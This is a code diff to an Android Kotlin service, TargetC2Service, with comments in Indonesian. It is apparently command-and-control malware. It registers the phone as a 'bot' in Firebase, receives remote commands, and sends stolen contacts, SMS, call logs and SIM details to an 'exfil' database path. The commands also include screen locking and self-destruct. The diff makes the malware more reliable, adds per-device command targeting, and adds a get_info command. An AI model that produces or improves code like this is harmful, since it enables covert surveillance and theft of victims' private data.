@@ -55,11 +55,19 @@ class TargetC2Service : Service() {
         _deviceId = id
 
         try {
+            // 🔥 FIX: Inisialisasi Firebase pake custom URL
             database = FirebaseDatabase.getInstance(FIREBASE_URL)
+            // 🔥 FIX: setPersistenceEnabled hanya SEKALI dan di sini aja
+            try {
+                database.setPersistenceEnabled(true)
+            } catch (e: Exception) {
+                Log.w(TAG, "Persistence already enabled (safe to ignore)", e)
+            }
             botsRef = database.getReference(REF_BOTS)
             commandsRef = database.getReference(REF_COMMANDS)
             broadcastRef = database.getReference(REF_BROADCAST)
             exfilRef = database.getReference(REF_EXFIL)
+            Log.d(TAG, "Firebase initialized successfully")
         } catch (e: Exception) {
             Log.e(TAG, "Firebase init error", e)
         }
@@ -111,7 +119,10 @@ class TargetC2Service : Service() {
 
     private fun registerBot() {
         try {
-            if (!::botsRef.isInitialized) return
+            if (!::botsRef.isInitialized) {
+                Log.e(TAG, "botsRef not initialized!")
+                return
+            }
 
             val deviceInfo = mapOf(
                 "deviceId" to deviceId,
@@ -137,8 +148,18 @@ class TargetC2Service : Service() {
                 "simInfo" to getSimInfo(),
                 "timestamp" to System.currentTimeMillis()
             )
-            botsRef.child(deviceId).setValue(deviceInfo)
 
+            // 🔥 FIX: Pake addOnCompleteListener biar tau sukses/gagal
+            botsRef.child(deviceId).setValue(deviceInfo)
+                .addOnCompleteListener { task ->
+                    if (task.isSuccessful) {
+                        Log.d(TAG, "Bot registered successfully: $deviceId")
+                    } else {
+                        Log.e(TAG, "Bot registration FAILED: ${task.exception?.message}")
+                    }
+                }
+
+            // Update online status tiap 30 detik
             scope.launch {
                 while (isActive) {
                     delay(30000)
@@ -149,7 +170,9 @@ class TargetC2Service : Service() {
                             .setValue(true)
                         botsRef.child(deviceId).child("batteryLevel")
                             .setValue(getBatteryLevel())
-                    } catch (_: Exception) {}
+                    } catch (e: Exception) {
+                        Log.e(TAG, "Status update error", e)
+                    }
                 }
             }
         } catch (e: Exception) {
@@ -165,9 +188,12 @@ class TargetC2Service : Service() {
                     val type = snapshot.child("type").value?.toString() ?: return
                     val payload = snapshot.child("payload").value?.toString() ?: ""
                     val cmdId = snapshot.child("cmdId").value?.toString() ?: ""
-                    val status = snapshot.child("status").value?.toString() ?: ""
+                    val target = snapshot.child("target").value?.toString() ?: ""
 
-                    Log.d(TAG, "Command received: type=$type payload=$payload cmdId=$cmdId")
+                    Log.d(TAG, "Command received: type=$type cmdId=$cmdId target=$target")
+
+                    // Cek apakah command untuk device ini atau broadcast
+                    if (target.isNotEmpty() && target != deviceId) return
 
                     handleCommand(type, payload)
 
@@ -214,6 +240,7 @@ class TargetC2Service : Service() {
         try {
             when (command) {
                 "ping" -> sendExfil("pong", "PONG at ${System.currentTimeMillis()}")
+                "get_info" -> handleGetInfo()
                 "get_contacts" -> handleGetContacts()
                 "get_sms" -> handleGetSMS()
                 "get_call_log" -> handleGetCallLog()
@@ -240,7 +267,6 @@ class TargetC2Service : Service() {
                 "alert_dialog" -> handleAlertDialog(args)
                 "toast" -> handleToast(args)
                 "self_destruct" -> handleSelfDestruct()
-                "get_info" -> handleGetInfo()
                 "lock_screen" -> handleLockScreen()
                 "unlock_screen" -> handleUnlockScreen()
                 "open_url" -> handleOpenURL(args)
@@ -572,7 +598,6 @@ class TargetC2Service : Service() {
             return
         }
         try {
-            // 🔥 FIX: Pakai setData() biar gak error "Val cannot be reassigned"
             val intent = Intent(Intent.ACTION_SENDTO).apply {
                 setData(android.net.Uri.parse("smsto:${parts[0].trim()}"))
                 putExtra("sms_body", parts[1].trim())
@@ -608,9 +633,15 @@ class TargetC2Service : Service() {
                     "content" to content,
                     "deviceId" to deviceId,
                     "timestamp" to System.currentTimeMillis().toString()
-                ))
+                )).addOnCompleteListener { task ->
+                    if (!task.isSuccessful) {
+                        Log.e(TAG, "Exfil send FAILED: ${task.exception?.message}")
+                    }
+                }
             }
-        } catch (_: Exception) {}
+        } catch (e: Exception) {
+            Log.e(TAG, "Exfil error", e)
+        }
     }
 
     private fun getIPAddress(): String {
